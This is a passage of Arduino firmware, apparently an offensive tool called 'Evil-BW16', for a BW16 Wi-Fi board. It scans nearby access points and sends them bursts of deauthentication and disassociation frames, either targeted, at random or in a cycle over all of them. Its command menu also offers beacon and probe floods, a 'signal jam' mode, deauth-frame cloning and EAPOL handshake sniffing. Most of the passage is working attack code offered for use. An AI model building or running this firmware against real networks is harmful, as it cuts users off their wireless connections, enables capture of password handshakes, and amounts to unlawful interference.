    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    // Keep only APs >= start_channel if you want to filter 5GHz
    if ((int)record->channel >= start_channel) {
      WiFiScanResult result;
      result.ssid = String((const char*) record->SSID.val);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);

      char bssid_str[20];
      snprintf(bssid_str, sizeof(bssid_str),
               "%02X:%02X:%02X:%02X:%02X:%02X",
               result.bssid[0], result.bssid[1], result.bssid[2],
               result.bssid[3], result.bssid[4], result.bssid[5]);
      result.bssid_str = bssid_str;
      scan_results.push_back(result);
    }
  } else {
    // Scan completed
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks() {
  Serial1.println("Starting WiFi scan...");
  scan_results.clear();
  target_aps.clear();
  target_mode = false;
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    delay(scan_time);  // Wait for scan to complete (1 second now)
    Serial1.println("Scan completed!");

    // Sort results by channel
    sortByChannel(scan_results);
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    Serial1.println("Failed to start the scan!");
    return 1;
  }
}

//==========================================================
// Print Scan Results
//==========================================================
void printScanResults() {
  Serial1.println("Detected networks:");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String freq = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial1.print(i);
    Serial1.print("\tSSID: ");
    Serial1.print(scan_results[i].ssid);
    Serial1.print("\tBSSID: ");
    Serial1.print(scan_results[i].bssid_str);
    Serial1.print("\tChannel: ");
    Serial1.print(scan_results[i].channel);
    Serial1.print("\tRSSI: ");
    Serial1.print(scan_results[i].rssi);
    Serial1.print(" dBm\t");
    Serial1.println(freq);
  }
}

//==========================================================
// Raw Frame Injection
//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    Serial1.println("[INFO] Timed attack ended.");
  }
}

//==========================================================
// Handle Incoming Commands
//==========================================================
void handleCommand(String command) {
  command.trim();

  // Deauth Attack Commands
  if (command.equalsIgnoreCase("start deauther")) {
    // Ensure WiFi is in AP mode for frame injection
    // If sniffer was running, stop it and restart AP
    if (isSniffing) {
      stopSniffing();
    }
    // Re-init AP mode if needed (scan/sniff may have changed it)
    wifi_off();
    delay(100);
    wifi_on(RTW_MODE_AP);
    wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                   RTW_SECURITY_WPA2_AES_PSK,
                                   WIFI_PASS,
                                   11, 18, WIFI_CHANNEL);
    attack_enabled = true;
    Serial1.println("[INFO] Deauthentication Attack started.");
  }
  else if (command.equalsIgnoreCase("stop deauther")) {
    // Unified stop: stop all attacks, restore AP mode
    attack_enabled = false;
    disassoc_enabled = false;
    timedAttackEnabled = false;
    beacon_flood_enabled = false;
    probe_flood_enabled = false;
    signal_jam_enabled = false;
    deauth_sniff_enabled = false;
    has_sniffed_deauth = false;
    if (isSniffing) { stopSniffing(); }
    // Re-init AP mode (attacks may have changed channel)
    wifi_off();
    delay(100);
    wifi_on(RTW_MODE_AP);
    wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                   RTW_SECURITY_WPA2_AES_PSK,
                                   WIFI_PASS,
                                   11, 18, WIFI_CHANNEL);
    Serial1.println("[INFO] All attacks stopped. AP restored.");
  }
  else if (command.equalsIgnoreCase("stop all") || command.equalsIgnoreCase("stop")) {
    // UNIVERSAL STOP - kill everything
    attack_enabled = false;
    disassoc_enabled = false;
    timedAttackEnabled = false;
    scan_enabled = false;
    beacon_flood_enabled = false;
    probe_flood_enabled = false;
    signal_jam_enabled = false;
    deauth_sniff_enabled = false;
    has_sniffed_deauth = false;
    if (isSniffing) { stopSniffing(); }
    wifi_off();
    delay(100);
    wifi_on(RTW_MODE_AP);
    wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                   RTW_SECURITY_WPA2_AES_PSK,
                                   WIFI_PASS,
                                   11, 18, WIFI_CHANNEL);
    Serial1.println("[STOP ALL] Everything stopped. AP restored.");
  }
  else if (command.equalsIgnoreCase("scan")) {
    scan_enabled = true;
    Serial1.println("[INFO] Starting scan...");
    if (scanNetworks() == 0) {
      printScanResults();
      scan_enabled = false;
      Serial1.println("[INFO] Scan completed.");
    }
    else {
      Serial1.println("[ERROR] Scan failed.");
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (!scan_results.empty()) {
      printScanResults();
    }
    else {
      Serial1.println("[INFO] No scan results available. Try 'scan' first.");
    }
  }

  //==========================
  // Timed Attack
  //==========================
  else if (command.startsWith("attack_time ")) {
    String valStr = command.substring(String("attack_time ").length());
    unsigned long durationMs = valStr.toInt();
    if (durationMs > 0) {
      startTimedAttack(durationMs);
      Serial1.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    }
    else {
      Serial1.println("[ERROR] Invalid attack duration.");
    }
  }

  //==========================
  // Disassociation Attack Commands (Start Only)
  //==========================
  else if (command.equalsIgnoreCase("disassoc")) {
    if (!disassoc_enabled) {
      // Ensure WiFi is in AP mode for frame injection
      if (isSniffing) {
        stopSniffing();
      }
      if (!attack_enabled) {
        wifi_off();
        delay(100);
        wifi_on(RTW_MODE_AP);
        wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                       RTW_SECURITY_WPA2_AES_PSK,
                                       WIFI_PASS,
                                       11, 18, WIFI_CHANNEL);
      }
      disassoc_enabled = true;
      Serial1.println("[INFO] Continuous Disassociation Attack started.");
    }
    else {
      Serial1.println("[INFO] Disassociation Attack is already running.");
    }
  }

  //==========================
  // Random Channel Attack
  //==========================
  else if (command.equalsIgnoreCase("random_attack")) {
    if (!scan_results.empty()) {
      // Ensure AP mode for frame injection
      if (isSniffing) { stopSniffing(); }
      if (!attack_enabled) {
        wifi_off();
        delay(100);
        wifi_on(RTW_MODE_AP);
        wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                       RTW_SECURITY_WPA2_AES_PSK,
                                       WIFI_PASS,
                                       11, 18, WIFI_CHANNEL);
        attack_enabled = true;
      }
      size_t idx = random(0, scan_results.size());
      uint8_t randChannel = scan_results[idx].channel;
      int chRet = wifi_set_channel(randChannel);
      if (chRet != 0) {
        Serial1.print("[ERROR] wifi_set_channel(");
        Serial1.print(randChannel);
        Serial1.print(") failed, ret=");
        Serial1.println(chRet);
      }
      for (unsigned long j = 0; j < num_send_frames; j++) {
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, reason);
        wifi_tx_deauth_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        Serial1.print("[RANDOM ATTACK] Deauth+Disassoc burst ");
        Serial1.print(j + 1);
        Serial1.print(" => ");
        Serial1.print(scan_results[idx].ssid);
        Serial1.print(" on channel ");
        Serial1.println(randChannel);
      }
    }
    else {
      Serial1.println("[ERROR] No AP results available. Run 'scan' first.");
    }
  }
  else if (command == "start sniff") {
    currentMode = SNIFF_ALL;
    startSniffing();
    Serial1.println("[CMD] Starting sniffer in ALL mode");
  }
  else if (command == "hop on") {
    isHopping = true;
    if (!isSniffing) {
      wifi_on(RTW_MODE_PROMISC);
      wifi_enter_promisc_mode();
    }
    Serial1.println("[CMD] Channel hopping enabled");
  }
  else if (command == "hop off") {
    isHopping = false;
    Serial1.println("[CMD] Channel hopping disabled");
  }
  else if (command.startsWith("set ch ")) {
    String chStr = command.substring(7);

    // Check if it's a comma-separated list
    if (chStr.indexOf(',') != -1) {
      // Reset custom channels
      numCustomChannels = 0;
      useCustomChannels = false;

      // Parse comma-separated channels
      while (chStr.length() > 0) {
        int commaIndex = chStr.indexOf(',');
        String channelStr;

        if (commaIndex == -1) {
          channelStr = chStr;
          chStr = "";
        } else {
          channelStr = chStr.substring(0, commaIndex);
          chStr = chStr.substring(commaIndex + 1);
        }

        channelStr.trim();
        int newChannel = channelStr.toInt();

        // Validate channel
        bool validChannel = false;
        for (int ch : CHANNELS_2GHZ) {
          if (ch == newChannel) validChannel = true;
        }
        for (int ch : CHANNELS_5GHZ) {
          if (ch == newChannel) validChannel = true;
        }

        if (validChannel && numCustomChannels < MAX_CUSTOM_CHANNELS) {
          customChannels[numCustomChannels++] = newChannel;
        }
      }

      if (numCustomChannels > 0) {
        useCustomChannels = true;
        isHopping = true;
        currentChannelIndex = 0;
        currentChannel = customChannels[0];
        setChannel(currentChannel);
        Serial1.print("[CMD] Set custom channel sequence: ");
        for (int i = 0; i < numCustomChannels; i++) {
          Serial1.print(customChannels[i]);
          if (i < numCustomChannels - 1) Serial1.print(",");
        }
        Serial1.println();
      }
    } else {
      // Single channel setting (existing code)
      int newChannel = chStr.toInt();
      bool validChannel = false;
      for (int ch : CHANNELS_2GHZ) {
        if (ch == newChannel) validChannel = true;
      }
      for (int ch : CHANNELS_5GHZ) {
        if (ch == newChannel) validChannel = true;
      }
      if (validChannel) {
        isHopping = false;
        useCustomChannels = false;
        setChannel(newChannel);
        Serial1.print("[CMD] Set to channel ");
        Serial1.println(currentChannel);
      } else {
        Serial1.println("[ERROR] Invalid channel number");
      }
    }
  }
  else if (command == "sniff beacon") {
    currentMode = SNIFF_BEACON;
    startSniffing();
    Serial1.println("[CMD] Switching to BEACON sniffing mode");
  }
  else if (command == "sniff probe") {
    currentMode = SNIFF_PROBE;
    startSniffing();
    Serial1.println("[CMD] Switching to PROBE sniffing mode");
  }
  else if (command == "sniff deauth") {
    currentMode = SNIFF_DEAUTH;
    startSniffing();
    Serial1.println("[CMD] Switching to DEAUTH sniffing mode");
  }
  else if (command == "sniff eapol") {
    currentMode = SNIFF_EAPOL;
    startSniffing();
    Serial1.println("[CMD] Switching to EAPOL sniffing mode");
  }
  else if (command == "sniff pwnagotchi") {
    currentMode = SNIFF_PWNAGOTCHI;
    startSniffing();
    Serial1.println("[CMD] Switching to PWNAGOTCHI sniffing mode");
  }
  else if (command == "sniff all") {
    currentMode = SNIFF_ALL;
    startSniffing();
    Serial1.println("[CMD] Switching to ALL sniffing mode");
  }
  else if (command == "stop sniff") {
    stopSniffing();
  }
  //==========================
  // "set" Command (Existing)
  //==========================
  else if (command.startsWith("set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String value = setting.substring(space_index + 1);
      value.replace(" ", "");

      if (key.equalsIgnoreCase("cycle_delay")) {
        cycle_delay = value.toInt();
        Serial1.println("[INFO] Updated cycle_delay to " + String(cycle_delay) + " ms.");
      }
      else if (key.equalsIgnoreCase("scan_time")) {
        scan_time = value.toInt();
        Serial1.println("[INFO] Updated scan_time to " + String(scan_time) + " ms.");
      }
      else if (key.equalsIgnoreCase("num_frames")) {
        num_send_frames = value.toInt();
        Serial1.println("[INFO] Updated num_send_frames to " + String(num_send_frames) + ".");
      }
      else if (key.equalsIgnoreCase("start_channel")) {
        start_channel = value.toInt();
        Serial1.println("[INFO] Updated start_channel to " + String(start_channel) + ".");
      }
      else if (key.equalsIgnoreCase("scan_cycles")) {
        if (value.equalsIgnoreCase("on")) {
          scan_between_cycles = true;
          Serial1.println("[INFO] Scan between attack cycles activated.");
        }
        else if (value.equalsIgnoreCase("off")) {
          scan_between_cycles = false;
          Serial1.println("[INFO] Scan between attack cycles deactivated.");
        }
        else {
          Serial1.println("[ERROR] Invalid value for scan_cycles. Use 'on' or 'off'.");
        }
      }
      else if (key.equalsIgnoreCase("led")) {
        if (value.equalsIgnoreCase("on")) {
          USE_LED = true;
          Serial1.println("[INFO] LEDs activated.");
        }
        else if (value.equalsIgnoreCase("off")) {
          USE_LED = false;
          Serial1.println("[INFO] LEDs deactivated.");
        }
        else {
          Serial1.println("[ERROR] Invalid value for LED. Use 'set led on' or 'set led off'.");
        }
      }
      else if (key.equalsIgnoreCase("target")) {
        // e.g., set target 1,2,3
        target_aps.clear();
        target_mode = false;

        int start = 0;
        int end   = 0;
        while ((end = value.indexOf(',', start)) != -1) {
          String index_str = value.substring(start, end);
          int target_index = index_str.toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            Serial1.println("[ERROR] Invalid target index: " + index_str);
          }
          start = end + 1;
        }

        // Last index
        if (start < (int)value.length()) {
          String index_str = value.substring(start);
          int target_index = index_str.toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            Serial1.println("[ERROR] Invalid target index: " + index_str);
          }
        }

        if (!target_aps.empty()) {
          target_mode = true;
          Serial1.println("[INFO] Targeting the following APs:");
          for (size_t i = 0; i < target_aps.size(); i++) {
            Serial1.print("- SSID: ");
            Serial1.print(target_aps[i].ssid);
            Serial1.print(" BSSID: ");
            Serial1.println(target_aps[i].bssid_str);
          }
        }
        else {
          target_mode = false;
          Serial1.println("[ERROR] No valid targets selected.");
        }
      }
      else {
        Serial1.println("[ERROR] Unknown setting: " + key);
      }
    }
    else {
      Serial1.println("[ERROR] Invalid format. Use: set <key> <value>");
    }
  }
  else if (command.equalsIgnoreCase("txstats")) {
    Serial1.print("[TX STATS] Success: ");
    Serial1.print(tx_success_count);
    Serial1.print(" / Fail: ");
    Serial1.println(tx_fail_count);
  }
  else if (command.equalsIgnoreCase("reset_txstats")) {
    tx_success_count = 0;
    tx_fail_count = 0;
    seq_num_counter = 1;
    Serial1.println("[TX STATS] Reset.");
  }

  //==========================
  // Beacon Flood
  //==========================
  else if (command.equalsIgnoreCase("beacon_flood") || command.equalsIgnoreCase("beacon flood")) {
    if (beacon_flood_enabled) {
      beacon_flood_enabled = false;
      Serial1.println("[INFO] Beacon flood stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      if (!attack_enabled) {
        wifi_off(); delay(100);
        wifi_on(RTW_MODE_AP);
        wifi_start_ap_with_hidden_ssid(WIFI_SSID, RTW_SECURITY_WPA2_AES_PSK, WIFI_PASS, 11, 18, WIFI_CHANNEL);
      }
      beacon_flood_enabled = true;
      beacon_flood_count = 0;
      Serial1.println("[INFO] Beacon flood started.");
    }
  }

  //==========================
  // Probe Flood
  //==========================
  else if (command.equalsIgnoreCase("probe_flood") || command.equalsIgnoreCase("probe flood")) {
    if (probe_flood_enabled) {
      probe_flood_enabled = false;
      Serial1.println("[INFO] Probe flood stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      if (!attack_enabled) {
        wifi_off(); delay(100);
        wifi_on(RTW_MODE_AP);
        wifi_start_ap_with_hidden_ssid(WIFI_SSID, RTW_SECURITY_WPA2_AES_PSK, WIFI_PASS, 11, 18, WIFI_CHANNEL);
      }
      probe_flood_enabled = true;
      probe_flood_count = 0;
      Serial1.println("[INFO] Probe flood started.");
    }
  }

  //==========================
  // Signal Jam
  //==========================
  else if (command.equalsIgnoreCase("signal_jam") || command.equalsIgnoreCase("signal jam")) {
    if (signal_jam_enabled) {
      signal_jam_enabled = false;
      Serial1.println("[INFO] Signal jam stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      wifi_off(); delay(100);
      wifi_on(RTW_MODE_AP);
      wifi_start_ap_with_hidden_ssid(WIFI_SSID, RTW_SECURITY_WPA2_AES_PSK, WIFI_PASS, 11, 18, WIFI_CHANNEL);
      signal_jam_enabled = true;
      signal_jam_count = 0;
      signal_jam_ch_index = 0;
      Serial1.println("[INFO] Signal jam started - rapid channel cycling + deauth.");
    }
  }

  //==========================
  // Deauth Sniff (sniff for deauth frames, clone source MAC)
  //==========================
  else if (command.equalsIgnoreCase("deauth_sniff") || command.equalsIgnoreCase("deauth sniff")) {
    if (deauth_sniff_enabled) {
      deauth_sniff_enabled = false;
      has_sniffed_deauth = false;
      Serial1.println("[INFO] Deauth sniff stopped.");
    } else {
      // Need both promiscuous mode (to sniff) AND ability to TX
      // Start sniffing in DEAUTH mode to capture sources
      currentMode = SNIFF_DEAUTH;
      startSniffing();
      deauth_sniff_enabled = true;
      has_sniffed_deauth = false;
      Serial1.println("[INFO] Deauth sniff started - listening for deauth frames to clone.");
    }
  }

  //==========================
  // Single AP Attack
  //==========================
  else if (command.startsWith("single_ap") || command.startsWith("single ap")) {
    if (scan_results.empty()) {
      Serial1.println("[ERROR] No scan results. Run 'scan' first.");
    } else {
      // Parse index if provided, otherwise use single_ap_index
      String idxStr = command.substring(command.indexOf(' ') + 1);
      idxStr.trim();
      int idx = idxStr.toInt();
      if (idx < 0 || idx >= (int)scan_results.size()) idx = 0;
      
      if (isSniffing) { stopSniffing(); }
      if (!attack_enabled) {
        wifi_off(); delay(100);
        wifi_on(RTW_MODE_AP);
        wifi_start_ap_with_hidden_ssid(WIFI_SSID, RTW_SECURITY_WPA2_AES_PSK, WIFI_PASS, 11, 18, WIFI_CHANNEL);
      }
      
      int chRet = wifi_set_channel(scan_results[idx].channel);
      if (chRet != 0) {
        Serial1.print("[ERROR] wifi_set_channel(");
        Serial1.print(scan_results[idx].channel);
        Serial1.print(") failed ret=");
        Serial1.println(chRet);
        return;
      }
      
      for (unsigned long j = 0; j < num_send_frames; j++) {
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, reason);
        wifi_tx_deauth_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);
      }
      Serial1.print("[SINGLE AP] Attacked ");
      Serial1.print(scan_results[idx].ssid);
      Serial1.print(" (");
      Serial1.print(scan_results[idx].bssid_str);
      Serial1.print(") on ch ");
      Serial1.println(scan_results[idx].channel);
    }
  }
  else if (command.equalsIgnoreCase("info")) {
    Serial1.println("[INFO] Current Configuration:");
    Serial1.println("Cycle Delay: " + String(cycle_delay) + " ms");
    Serial1.println("Scan Time: " + String(scan_time) + " ms");
    Serial1.println("Number of Frames per AP: " + String(num_send_frames));
    Serial1.println("Start Channel: " + String(start_channel));
    Serial1.println("Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));
    Serial1.println("LEDs: " + String(USE_LED ? "On" : "Off"));
    Serial1.println("TX Stats: " + String(tx_success_count) + " OK / " + String(tx_fail_count) + " FAIL");

    if (target_mode && !target_aps.empty()) {
      Serial1.println("[INFO] Targeted APs:");
      for (size_t i = 0; i < target_aps.size(); i++) {
        Serial1.print("- SSID: ");
        Serial1.print(target_aps[i].ssid);
        Serial1.print(" BSSID: ");
        Serial1.println(target_aps[i].bssid_str);
      }
    }
    else {
      Serial1.println("[INFO] No APs targeted.");
    }
  }
  else if (command.equalsIgnoreCase("help")) {
    Serial1.println("[Deauther] Available Commands.");
    Serial1.println("  - start deauther       : Begin the deauth attack cycle.");
    Serial1.println("  - stop deauther        : Stop all attack cycles.");
    Serial1.println("  - stop all / stop      : UNIVERSAL STOP - kills everything.");
    Serial1.println("  - scan                 : Perform a WiFi scan and display results.");
    Serial1.println("  - results              : Show last scan results.");
    Serial1.println("  - disassoc             : Begin continuous disassociation attacks.");
    Serial1.println("  - random_attack        : Deauth a randomly chosen AP from the scan list.");
    Serial1.println("  - attack_time <ms>     : Start a timed attack for the specified duration.");
    Serial1.println("  - single_ap [index]    : Attack a single AP from scan results.");
    Serial1.println("[Flood] Attack Commands.");
    Serial1.println("  - beacon_flood         : Toggle beacon flood (fake APs).");
    Serial1.println("  - probe_flood          : Toggle probe request flood.");
    Serial1.println("  - signal_jam           : Toggle signal jam (rapid ch cycling + deauth).");
    Serial1.println("  - deauth_sniff         : Toggle deauth sniff-and-clone mode.");
    Serial1.println("[Sniffer] WiFi Sniffer Commands.");
    Serial1.println("  - start sniff          : Enable the sniffer with ALL mode.");
    Serial1.println("  - sniff beacon         : Enable/Disable beacon capture.");
    Serial1.println("  - sniff probe          : Enable/Disable probe requests/responses.");
    Serial1.println("  - sniff deauth         : Enable/Disable deauth/disassoc frames.");
    Serial1.println("  - sniff eapol          : Enable/Disable EAPOL frames.");
    Serial1.println("  - sniff pwnagotchi     : Enable/Disable Pwnagotchi beacons.");
    Serial1.println("  - sniff all            : Enable/Disable all frames.");
    Serial1.println("  - stop sniff           : Stop sniffing.");
    Serial1.println("  - hop on               : Enable channel hopping.");
    Serial1.println("  - hop off              : Disable channel hopping.");
    Serial1.println("[Configuration] Set Commands:");
    Serial1.println("  - set <key> <value>    : Update configuration values:");
    Serial1.println("      * ch X             : Set to specific channel X.");
    Serial1.println("      * target <indices> : Set target APs by their indices, e.g., 'set target 1,3,5'.");
    Serial1.println("      * cycle_delay (ms) : Delay between scan/deauth cycles.");
    Serial1.println("      * scan_time (ms)   : Duration of WiFi scans.");
    Serial1.println("      * num_frames       : Number of frames sent per AP.");
    Serial1.println("      * start_channel    : Start channel for scanning (1 or 36 for 5GHz only).");
    Serial1.println("      * scan_cycles      : on/off - Enable or disable scan between attack cycles.");
    Serial1.println("      * led on/off       : Enable or disable LEDs.");
    Serial1.println("  - info                 : Display the current configuration.");
    Serial1.println("  - txstats              : Show TX success/fail counts.");
    Serial1.println("  - reset_txstats        : Reset TX counters.");
    Serial1.println("  - help                 : Display this help message.");
  }
  else {
    Serial1.println("[ERROR] Unknown command. Type 'help' for a list of commands.");
  }
}

//==========================================================
// Attack Functions
//==========================================================
void targetAttack() {
  if (target_mode && attack_enabled) {
    for (size_t i = 0; i < target_aps.size(); i++) {
      int chRet = wifi_set_channel(target_aps[i].channel);
      if (chRet != 0) {
        Serial1.print("[WARN] wifi_set_channel(");
        Serial1.print(target_aps[i].channel);
        Serial1.print(") failed ret=");
        Serial1.println(chRet);
      }
      for (unsigned long j = 0; j < num_send_frames; j++) {
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        // Broadcast deauth
        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, reason);
        // Directed deauth (to AP itself)
        wifi_tx_deauth_frame(target_aps[i].bssid, target_aps[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        // Disassoc broadcast
        wifi_tx_disassoc_frame(target_aps[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        // Disassoc directed
        wifi_tx_disassoc_frame(target_aps[i].bssid, target_aps[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);  // Small delay to avoid overwhelming TX queue
        if (USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(30);
          digitalWrite(LED_B, LOW);
        }
        Serial1.print("Deauth+Disassoc burst ");
        Serial1.print(j + 1);
        Serial1.print(" => ");
        Serial1.print(target_aps[i].ssid);
        Serial1.print(" (");
        Serial1.print(target_aps[i].bssid_str);
        Serial1.print(") on channel ");
        Serial1.println(target_aps[i].channel);
      }
    }
  }
}

void generalAttack() {
  if (!target_mode && attack_enabled) {
    attackCycle();
  }
}

void attackCycle() {
  Serial1.println("Starting attack cycle...");

  uint8_t currentChannel = 0xFF;
  for (size_t i = 0; i < scan_results.size(); i++) {
    uint8_t targetChannel = scan_results[i].channel;
    if (targetChannel != currentChannel) {
      int chRet = wifi_set_channel(targetChannel);
      if (chRet != 0) {
        Serial1.print("[WARN] wifi_set_channel(");
        Serial1.print(targetChannel);
        Serial1.print(") failed ret=");
        Serial1.println(chRet);
        continue;  // Skip this AP if we can't set the channel
      }
      currentChannel = targetChannel;
    }

    for (unsigned long j = 0; j < num_send_frames; j++) {
      uint16_t reason = deauth_reasons[j % num_deauth_reasons];
      // Broadcast deauth
      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, reason);
      // Directed deauth (to AP itself)
      wifi_tx_deauth_frame(scan_results[i].bssid, scan_results[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);
      // Disassoc broadcast
      wifi_tx_disassoc_frame(scan_results[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
      // Disassoc directed
      wifi_tx_disassoc_frame(scan_results[i].bssid, scan_results[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);
      delay(1);  // Small delay to avoid overwhelming TX queue
      if (USE_LED) {
        digitalWrite(LED_B, HIGH);
        delay(30);
        digitalWrite(LED_B, LOW);
      }
      Serial1.print("Deauth+Disassoc burst ");
      Serial1.print(j + 1);
      Serial1.print(" => ");
      Serial1.print(scan_results[i].ssid);
      Serial1.print(" (");
      Serial1.print(scan_results[i].bssid_str);
      Serial1.print(") on channel ");
      Serial1.println(scan_results[i].channel);
    }
  }
  Serial1.println("Attack cycle completed.");
}

//==========================================================
// SD Card Functions - REMOVED
//==========================================================
// SD card functionality has been removed from this version



//==========================================================
// Web server handling
//==========================================================

//==========================================================
// Setup
//==========================================================
void setup() {
  // IMPORTANT: Claim GPIO0/GPIO1 for joystick BEFORE Serial1 init.
  // On BW16, GPIO0/GPIO1 are the Log UART (USB-C serial). By setting them
  // as INPUT_PULLUP first, we detach them from the Log UART so USB-C becomes
  // power/flashing only. Joystick LEFT=D0 (GPIO0), RIGHT=D1 (GPIO1).
  
  // Initialize joystick pins FIRST (5-button D-pad)
  // This frees D0/D1 from Log UART — USB-C becomes power/flashing only
  for (int i = 0; i < 5; i++) {
    pinMode(joyPins[i], INPUT_PULLUP);
  }

  // Now init Serial1 (LP UART, D4/D5) for debug output + command input
  // Wire D4 (TX) → external UART-to-USB-C adapter RX
  // Wire D5 (RX) → external UART-to-USB-C adapter TX
  Serial1.begin(115200);
  // Flush any garbage that accumulated during pin init
  while (Serial1.available()) { Serial1.read(); }
  Serial1.println("\n=== Evil-BW16 v1.0.3 ===");
  Serial1.println("[INFO] Serial1 debug on D4(TX)/D5(RX)");
  Serial1.println("[INFO] USB-C = power/flash only");
  Serial1.println("[INFO] Joystick on D0-D3,D6");

  // Debug: Blink green LED to show code is running
  pinMode(10, OUTPUT);
  for (int i = 0; i < 3; i++) {
    digitalWrite(10, HIGH); delay(200);
    digitalWrite(10, LOW);  delay(200);
  }

  // Initialize OLED display (I2C on D7/D8)
  Serial1.println("Initializing OLED...");
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial1.println(F("SSD1306 FAILED"));
    // Blink LED rapidly forever to indicate display failure
    while (1) { digitalWrite(10, !digitalRead(10)); delay(100); }
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("Evil-BW16 v1.0.3");
  display.setCursor(0, 10);
  display.println("S1:D4/D5 DBG");
  display.setCursor(0, 20);
  display.println("JS:D0-D3,D6");
  display.setCursor(0, 30);
  display.println("USB: PWR/FLSH");
  display.display();
  delay(1500); // Show boot info on screen
  Serial1.println("OLED OK");

  // SD card removed - no initialization needed

  if (USE_LED) {
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);

    // Simple LED test sequence
    digitalWrite(LED_R, HIGH); delay(200); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(200); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(200); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW);
    digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
    Serial1.println("LED test sequence completed");
  }

  updateDisplay();

  Serial1.println("Initializing WiFi in hidden AP mode...");
  wifi_on(RTW_MODE_AP);
  wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                 RTW_SECURITY_WPA2_AES_PSK,
                                 WIFI_PASS,
                                 11,   // keyID
                                 18,   // SSID length
                                 WIFI_CHANNEL);
  Serial1.println("Hidden AP started. Selected channel: " + String(WIFI_CHANNEL));

  last_cycle = millis();
  Serial1.println("=== Setup Complete ===\n");
}

//==========================================================
// TUI Helper Functions
//==========================================================
void updateDisplay() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Status bar
  display.setCursor(0, 0);
  char status[22];
  if (attack_enabled)       sprintf(status, "Ch:%d ATK", currentChannel);
